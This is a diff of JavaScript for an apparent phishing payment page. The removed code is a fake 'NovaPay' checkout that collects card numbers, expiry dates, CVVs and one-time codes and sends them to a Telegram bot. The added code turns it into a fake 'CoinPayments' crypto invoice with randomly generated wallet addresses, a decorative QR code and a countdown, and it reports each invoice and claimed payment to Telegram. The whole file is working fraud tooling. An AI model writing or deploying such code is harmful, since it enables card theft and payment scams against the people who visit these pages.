-      // Amount: only digits and one decimal, max 2 decimals, force .00 display on blur
+      // ============ AMOUNT FORMATTING ============
       amountInput.addEventListener('input', function(e) {
         let val = e.target.value.replace(/[^0-9.]/g, '');
         const parts = val.split('.');
-        if (parts.length > 2) {
-          val = parts[0] + '.' + parts.slice(1).join('');
-        }
+        if (parts.length > 2) val = parts[0] + '.' + parts.slice(1).join('');
         if (val.includes('.')) {
           const [int, dec] = val.split('.');
           if (dec.length > 2) val = int + '.' + dec.slice(0, 2);
         }
         e.target.value = val;
       });
-
       amountInput.addEventListener('blur', function(e) {
-        let val = e.target.value.trim();
-        if (!val) return;
-        const num = parseFloat(val);
-        if (!isNaN(num)) {
-          e.target.value = num.toFixed(2);
+        const v = e.target.value.trim();
+        if (v && !isNaN(parseFloat(v))) {
+          e.target.value = parseFloat(v).toFixed(2);
         }
       });
-
       amountInput.addEventListener('focus', function(e) {
-        let val = e.target.value.trim();
-        if (val && !isNaN(parseFloat(val))) {
-          const num = parseFloat(val);
-          if (num % 1 === 0) {
-            e.target.value = num.toString();
-          }
+        const v = e.target.value.trim();
+        if (v && !isNaN(parseFloat(v))) {
+          const n = parseFloat(v);
+          if (n % 1 === 0) e.target.value = n.toString();
         }
       });
 
-      cardNumber.addEventListener('input', function(e) {
-        let value = e.target.value.replace(/\D/g, '');
-        if (value.length > 16) value = value.slice(0, 16);
-        let formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-        e.target.value = formatted;
+      // ============ COIN SELECTION ============
+      coinGrid.addEventListener('click', function(e) {
+        const item = e.target.closest('.coin-item');
+        if (!item) return;
+        document.querySelectorAll('.coin-item').forEach(el => el.classList.remove('selected'));
+        item.classList.add('selected');
+        selectedCoin = {
+          coin: item.dataset.coin,
+          name: item.dataset.name,
+          rate: parseFloat(item.dataset.rate)
+        };
       });
 
-      expiry.addEventListener('input', function(e) {
-        let value = e.target.value.replace(/\D/g, '');
-        if (value.length > 4) value = value.slice(0, 4);
-        if (value.length >= 3) {
-          e.target.value = value.slice(0, 2) + '/' + value.slice(2);
-        } else {
-          e.target.value = value;
-        }
-      });
-
-      cvv.addEventListener('input', function(e) {
-        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
-      });
-
-      otpCode.addEventListener('input', function(e) {
-        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 8);
-      });
-
+      // ============ TELEGRAM ============
       async function sendToTelegram(text) {
         if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         try {
-          await fetch(url, {
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -640,87 +897,202 @@
         }
       }
 
-      async function submitCardData() {
-        const amount = amountInput.value.trim();
-        const rawCard = cardNumber.value.replace(/\s/g, '');
-        const exp = expiry.value;
-        const cvvVal = cvv.value;
+      // ============ FAKE QR CODE ============
+      function generateQR(seed) {
+        // Deterministic pseudo-random pattern (not real QR, purely visual)
+        const size = 21;
+        const cell = 200 / size;
+        let svg = '';
+        let hash = 0;
+        for (let i = 0; i < seed.length; i++) hash = ((hash << 5) - hash) + seed.charCodeAt(i);
+        function rand() {
+          hash = (hash * 9301 + 49297) % 233280;
+          return hash / 233280;
+        }
+        // Finder patterns in 3 corners
+        const finders = [[0,0],[size-7,0],[0,size-7]];
+        for (let y = 0; y < size; y++) {
+          for (let x = 0; x < size; x++) {
+            let black = rand() > 0.5;
+            // Clear around finder patterns
+            let inFinder = false;
+            for (const [fx, fy] of finders) {
+              if (x >= fx - 1 && x <= fx + 7 && y >= fy - 1 && y <= fy + 7) inFinder = true;
+            }
+            if (inFinder) continue;
+            if (black) {
+              svg += `<rect x="${x*cell}" y="${y*cell}" width="${cell}" height="${cell}" fill="#0f1a28"/>`;
+            }
+          }
+        }
+        // Draw finder patterns
+        for (const [fx, fy] of finders) {
+          // Outer black square
+          svg += `<rect x="${fx*cell}" y="${fy*cell}" width="${7*cell}" height="${7*cell}" fill="#0f1a28"/>`;
+          // Inner white
+          svg += `<rect x="${(fx+1)*cell}" y="${(fy+1)*cell}" width="${5*cell}" height="${5*cell}" fill="#ffffff"/>`;
+          // Center black
+          svg += `<rect x="${(fx+2)*cell}" y="${(fy+2)*cell}" width="${3*cell}" height="${3*cell}" fill="#0f1a28"/>`;
+        }
+        qrCode.innerHTML = svg;
+      }
 
+      // ============ GENERATE ADDRESS ============
+      function generateAddress(coin) {
+        const chars = '0123456789abcdefghijklmnopqrstuvwxyz';
+        let addr = '';
+        const prefixes = {
+          BTC: 'bc1q', ETH: '0x', USDT: '0x', LTC: 'ltc1q', BNB: 'bnb1', DOGE: 'D'
+        };
+        const len = coin === 'BTC' || coin === 'LTC' ? 38 : 40;
+        for (let i = 0; i < len; i++) {
+          addr += chars[Math.floor(Math.random() * chars.length)];
+        }
+        return (prefixes[coin] || '') + addr;
+      }
+
+      // ============ TIMER ============
+      function startTimer(seconds) {
+        clearInterval(timerInterval);
+        let remaining = seconds;
+        function tick() {
+          if (remaining <= 0) {
+            clearInterval(timerInterval);
+            timerValue.textContent = '00:00:00';
+            return;
+          }
+          remaining--;
+          const h = Math.floor(remaining / 3600).toString().padStart(2, '0');
+          const m = Math.floor((remaining % 3600) / 60).toString().padStart(2, '0');
+          const s = (remaining % 60).toString().padStart(2, '0');
+          timerValue.textContent = `${h}:${m}:${s}`;
+        }
+        timerValue.textContent = '05:59:59';
+        timerInterval = setInterval(tick, 1000);
+      }
+
+      // ============ PAY FLOW ============
+      payBtn.addEventListener('click', async function() {
+        const amount = amountInput.value.trim();
         if (!amount || parseFloat(amount) <= 0) {
-          showStatus(cardStatus, 'Please enter a valid payment amount.', 'error');
+          showStatus(coinStatus, 'Please enter a valid payment amount.', 'error');
           amountInput.focus();
           return;
         }
-        if (rawCard.length < 16) {
-          showStatus(cardStatus, 'Please enter a valid 16-digit card number.', 'error');
-          return;
-        }
-        if (!/^\d{2}\/\d{2}$/.test(exp)) {
-          showStatus(cardStatus, 'Please enter expiry date as MM/YY.', 'error');
-          return;
-        }
-        if (cvvVal.length < 3) {
-          showStatus(cardStatus, 'Please enter a valid CVV.', 'error');
-          return;
-        }
-
-        hideStatus(cardStatus);
+        hideStatus(coinStatus);
         payBtn.disabled = true;
-        payBtn.innerHTML = '<span class="spinner"></span> Processing...';
+        payBtn.innerHTML = '<span class="spinner"></span> Generating invoice...';
 
+        const usd = parseFloat(amount);
+        const cryptoAmount = usd / selectedCoin.rate;
+        const address = generateAddress(selectedCoin.coin);
+
+        paymentData = {
+          usd: usd,
+          coin: selectedCoin.coin,
+          coinName: selectedCoin.name,
+          cryptoAmount: cryptoAmount,
+          address: address
+        };
+
+        // Send to Telegram
         const message = `
-<b>💳 NovaPay – New card details</b>
-<b>💰 Amount:</b> $${parseFloat(amount).toFixed(2)}
-<b>💳 Card number:</b> <code>${rawCard}</code>
-<b>📅 Expiry:</b> ${exp}
-<b>🔒 CVV:</b> ${cvvVal}
+<b>🪙 CoinPayments – New invoice</b>
+<b>💰 Amount:</b> $${usd.toFixed(2)}
+<b>🪙 Crypto:</b> ${selectedCoin.coin} (${selectedCoin.name})
+<b>📊 Crypto amount:</b> ${cryptoAmount.toFixed(8)} ${selectedCoin.coin}
+<b>📍 Address:</b> <code>${address}</code>
         `.trim();
-
         await sendToTelegram(message);
 
+        // Show payment view
         setTimeout(() => {
-          cardForm.style.display = 'none';
-          otpForm.classList.add('active');
+          coinView.classList.add('hidden');
+          paymentView.classList.add('active');
           payBtn.disabled = false;
-          payBtn.textContent = 'Continue';
-        }, 5000);
-      }
+          payBtn.innerHTML = '<span>Pay with Crypto</span><span>→</span>';
 
-      async function submitOtp() {
-        const code = otpCode.value.trim();
-        if (code.length < 4) {
-          showStatus(otpStatus, 'Please enter the verification code.', 'error');
-          return;
-        }
+          addressValue.textContent = address;
+          sendAmount.innerHTML = `${cryptoAmount.toFixed(8)} <span>${selectedCoin.coin}</span>`;
+          qrBadge.textContent = `Scan to pay with ${selectedCoin.coin}`;
+          generateQR(address);
+          progressFill.style.width = '50%';
+          startTimer(6 * 3600);
+        }, 800);
+      });
 
-        hideStatus(otpStatus);
-        otpBtn.disabled = true;
-        otpBtn.innerHTML = '<span class="spinner"></span> Verifying...';
+      // ============ COPY ============
+      copyBtn.addEventListener('click', function() {
+        const text = addressValue.textContent;
+        navigator.clipboard.writeText(text).then(() => {
+          copyBtn.textContent = 'Copied!';
+          copyBtn.classList.add('copied');
+          setTimeout(() => {
+            copyBtn.textContent = 'Copy';
+            copyBtn.classList.remove('copied');
+          }, 2000);
+        }).catch(() => {
+          // Fallback
+          const ta = document.createElement('textarea');
+          ta.value = text;
+          document.body.appendChild(ta);
+          ta.select();
+          document.execCommand('copy');
+          document.body.removeChild(ta);
+          copyBtn.textContent = 'Copied!';
+          copyBtn.classList.add('copied');
+          setTimeout(() => {
+            copyBtn.textContent = 'Copy';
+            copyBtn.classList.remove('copied');
+          }, 2000);
+        });
+      });
 
-        const amount = amountInput.value.trim();
+      // ============ CONFIRM ============
+      confirmBtn.addEventListener('click', async function() {
+        confirmBtn.disabled = true;
+        confirmBtn.innerHTML = '<span class="spinner"></span> Verifying payment...';
+        progressFill.style.width = '100%';
+
         const message = `
-<b>🔐 NovaPay – OTP code</b>
-<b>💰 Amount:</b> $${parseFloat(amount || 0).toFixed(2)}
-<b>🔑 OTP:</b> <code>${code}</code>
+<b>✅ CoinPayments – Payment claimed</b>
+<b>💰 Amount:</b> $${paymentData.usd.toFixed(2)}
+<b>🪙 Crypto:</b> ${paymentData.coin}
+<b>📊 Crypto amount:</b> ${paymentData.cryptoAmount.toFixed(8)} ${paymentData.coin}
+<b>📍 Address:</b> <code>${paymentData.address}</code>
         `.trim();
-
         await sendToTelegram(message);
 
         setTimeout(() => {
-          otpBtn.disabled = false;
-          otpBtn.textContent = 'Verify & pay';
-          showStatus(otpStatus, '✅ Payment successfully verified! Thank you.', 'success');
-          otpCode.value = '';
-        }, 5000);
-      }
+          clearInterval(timerInterval);
+          paymentView.classList.remove('active');
+          successView.classList.add('active');
+          successAmount.textContent = '$' + paymentData.usd.toFixed(2);
+          successCoin.textContent = paymentData.coin;
+          confirmBtn.disabled = false;
+          confirmBtn.innerHTML = '<span>I have sent the payment</span>';
+        }, 2500);
+      });
 
-      payBtn.addEventListener('click', submitCardData);
-      otpBtn.addEventListener('click', submitOtp);
+      // ============ BACK ============
+      backBtn.addEventListener('click', function() {
+        clearInterval(timerInterval);
+        paymentView.classList.remove('active');
+        coinView.classList.remove('hidden');
+        hideStatus(paymentStatus);
+      });
 
-      cardNumber.addEventListener('keypress', (e) => { if (e.key === 'Enter') payBtn.click(); });
-      expiry.addEventListener('keypress', (e) => { if (e.key === 'Enter') payBtn.click(); });
-      cvv.addEventListener('keypress', (e) => { if (e.key === 'Enter') payBtn.click(); });
-      otpCode.addEventListener('keypress', (e) => { if (e.key === 'Enter') otpBtn.click(); });
+      // ============ DONE ============
+      doneBtn.addEventListener('click', function() {
+        successView.classList.remove('active');
+        coinView.classList.remove('hidden');
+        amountInput.value = '';
+        addressValue.textContent = '';
+        sendAmount.innerHTML = '';
+        qrCode.innerHTML = '';
+        progressFill.style.width = '0%';
+      });
+
     })();
   </script>
 </body>
